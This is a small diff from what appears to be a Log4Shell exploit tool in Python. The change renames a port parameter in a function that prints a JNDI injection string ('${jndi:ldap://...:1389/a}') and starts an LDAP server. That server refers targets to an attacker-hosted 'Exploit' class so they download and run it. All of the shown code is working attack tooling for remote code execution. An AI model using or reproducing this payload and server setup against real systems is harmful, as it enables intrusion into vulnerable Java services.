@@ -90,11 +90,11 @@ def check_java() -> bool:
     return exit_code == 0
 
 
-def ldap_server(userip: str, lport: int) -> None:
+def ldap_server(userip: str, webport: int) -> None:
     sendme = "${jndi:ldap://%s:1389/a}" % (userip)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
 
-    url = "http://{}:{}/#Exploit".format(userip, lport)
+    url = "http://{}:{}/#Exploit".format(userip, webport)
     subprocess.run([
         os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
         "-cp",
